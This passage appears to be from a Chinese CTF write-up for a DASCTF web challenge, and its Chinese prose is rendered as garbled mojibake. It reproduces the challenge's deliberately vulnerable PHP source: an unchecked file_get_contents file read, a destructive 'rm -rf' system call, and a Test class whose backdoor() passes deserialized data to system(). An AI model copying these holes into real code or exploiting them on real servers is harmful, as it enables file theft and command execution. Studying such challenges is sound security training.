class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">no</span>-<span class="title">js</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">meta</span> <span class="title">charset</span>=&quot;<span class="title">UTF</span>-8&quot; /&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">meta</span> <span class="title">http</span>-<span class="title">equiv</span>=&quot;<span class="title">X</span>-<span class="title">UA</span>-<span class="title">Compatible</span>&quot; <span class="title">content</span>=&quot;<span class="title">IE</span>=<span class="title">edge</span>&quot;&gt; </span></span><br><span class="line"><span class="class">&lt;<span class="title">meta</span> <span class="title">name</span>=&quot;<span class="title">viewport</span>&quot; <span class="title">content</span>=&quot;<span class="title">width</span>=<span class="title">device</span>-<span class="title">width</span>, <span class="title">initial</span>-<span class="title">scale</span>=1&quot;&gt; </span></span><br><span class="line"><span class="class">&lt;<span class="title">title</span>&gt;<span class="title">login</span>&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">css</span>&quot; <span class="title">href</span>=&quot;<span class="title">css</span>/<span class="title">button</span>.<span class="title">css</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">css</span>&quot; <span class="title">href</span>=&quot;<span class="title">css</span>/<span class="title">button</span>.<span class="title">min</span>.<span class="title">css</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">link</span> <span class="title">rel</span>=&quot;<span class="title">stylesheet</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">css</span>&quot; <span class="title">href</span>=&quot;<span class="title">css</span>/<span class="title">input</span>.<span class="title">css</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="class">		.<span class="title">show</span></span>&#123;</span><br><span class="line">			text-align:center;</span><br><span class="line">			margin-left:auto;</span><br><span class="line">			margin-right:auto;</span><br><span class="line">			margin-top:<span class="number">240</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		.run&#123;</span><br><span class="line">			text-align:right;</span><br><span class="line">			margin-left:auto;</span><br><span class="line">			margin-right:auto;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">run</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">ui</span> <span class="title">animated</span> <span class="title">button</span>&quot; <span class="title">tabindex</span>=&quot;0&quot; <span class="title">onclick</span>=&quot;<span class="title">window</span>.<span class="title">location</span>.<span class="title">href</span>=&#x27;<span class="title">file</span>.<span class="title">php</span>?<span class="title">m</span>=<span class="title">logout</span>&#x27;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hidden</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;æ¶¦!&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">visible</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;ğŸƒ&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">show</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">		</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class"><span class="title">session_start</span>();</span></span><br><span class="line"><span class="class"><span class="title">include</span> &#x27;<span class="title">class</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">isLogin</span>&#x27;] !== <span class="title">true</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;å·ç™»ä¸€ä¸‹è°¢è°¢ã€‚&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$form</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;file.php?m=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;button class=&quot;mini ui button&quot; &gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;</span></span><br><span class="line"><span class="string">  æäº¤</span></span><br><span class="line"><span class="string">&lt;/font&gt;&lt;/font&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">file</span>();</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;<span class="keyword">die</span>(<span class="variable">$form</span>);&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$type</span> = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$type</span>)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$type</span>));</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;ä½ é£Ÿä¸é£Ÿæ²¹é¥¼ğŸ¤¬&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;show&#x27;</span>:</span><br><span class="line">		<span class="keyword">die</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">		<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">rmfile</span>();</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;å…¨åˆ å¹²å‡€äº†æğŸ˜‹&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;å·²é€€å‡ºç™»å½•&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Halo! &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h2&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">ui</span> <span class="title">animated</span> <span class="title">button</span>&quot; <span class="title">tabindex</span>=&quot;0&quot; <span class="title">onclick</span>=&quot;<span class="title">window</span>.<span class="title">location</span>.<span class="title">href</span>=&#x27;<span class="title">file</span>.<span class="title">php</span>?<span class="title">m</span>=<span class="title">upload</span>&#x27;&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">visible</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;æ¥ç‚¹ğŸ˜å›¾&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hidden</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;ğŸ¥µ&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">ui</span> <span class="title">vertical</span> <span class="title">animated</span> <span class="title">button</span>&quot; <span class="title">tabindex</span>=&quot;0&quot; <span class="title">onclick</span>=&quot;<span class="title">window</span>.<span class="title">location</span>.<span class="title">href</span>=&#x27;<span class="title">file</span>.<span class="title">php</span>?<span class="title">m</span>=<span class="title">rm</span>&#x27;&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hidden</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;é”€æ¯è¯æ®&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">visible</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;ğŸ§¹&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">ui</span> <span class="title">animated</span> <span class="title">fade</span> <span class="title">button</span>&quot; <span class="title">tabindex</span>=&quot;0&quot; <span class="title">onclick</span>=&quot;<span class="title">window</span>.<span class="title">location</span>.<span class="title">href</span>=&#x27;<span class="title">file</span>.<span class="title">php</span>?<span class="title">m</span>=<span class="title">show</span>&#x27;&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">visible</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;<span class="title">cancan</span> <span class="title">need</span>&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hidden</span> <span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">font</span> <span class="title">style</span>=&quot;<span class="title">vertical</span>-<span class="title">align</span>: <span class="title">inherit</span>;&quot;&gt;ğŸ‘€&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">package</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»è¿™é‡Œè¿˜å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªclass.php,è¯»å–:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isLogin&#x27;</span>] = True;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$cklen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cklen</span> != <span class="number">0</span> <span class="keyword">and</span> <span class="variable">$cklen</span> &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">#æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$white</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\&#x27;file.php?m=show&amp;filename=\&#x27;+document.getElementById(\&#x27;filename\&#x27;).value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$filename</span>))&#123;<span class="keyword">die</span>();&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)).<span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;dasctf&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.<span class="subst">$type</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload success! Path: upload/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rmfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf /var/www/html/upload/*&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>,<span class="variable">$this</span>-&gt;white))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;./upload&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="string">&quot;Don&#x27;t make dream.Wake up plz!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>],<span class="number">0</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;Hack by <span class="subst">$file</span> !&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Unreachable! :)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9?$@]+/&#x27;</span>, <span class="variable">$this</span>-&gt;value))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="string">&#x27;nono~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¤§è‡´é‡è¦çš„å°±è¿™ä¸¤ä¸ªç±»äº†ï¼Œæˆ‘ç¬¬ä¸€çœ¼çœ‹åˆ°äº†Wakeupä»¥ä¸ºæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œç»“æœä¸è¡Œï¼ŒåŸå› æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹PHPçš„ç‰ˆæœ¬<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669900987731-5943d453-619b-475b-8826-f3cc40be6fb1.png#averageHue=%23fefcfb&clientId=u43d448bb-efee-4&from=paste&height=34&id=u95e8c029&name=image.png&originHeight=43&originWidth=267&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2409&status=done&style=none&taskId=u511d32a1-e902-4694-ad2e-91048b5fbdf&title=&width=213.6" alt="image.png"><br>wowï¼Œä»¤äººå°Šè´µçš„7.45ç‰ˆæœ¬ï¼Œçœ‹æ¥æ˜¯æœ‰æ„å®‰æ’è¿™æ ·ï¼Œ**__wakeupçš„å¸¸è§„ç»•è¿‡åœ¨7.03ä¸‹æ‰æœ‰ç”¨ï¼**ç®€å•çš„åˆ†æäº†ä¸€ä¸‹ï¼Œå‡å¦‚è¿™æ ·ä¸è¡Œé‚£æ€ä¹ˆæ ·æ‰å¯ä»¥å»è°ƒç”¨backdoorå‡½æ•°å‘¢ï¼Œå…ˆåˆ†æä¸€ä¸‹backdoorå‡½æ•°:</p>
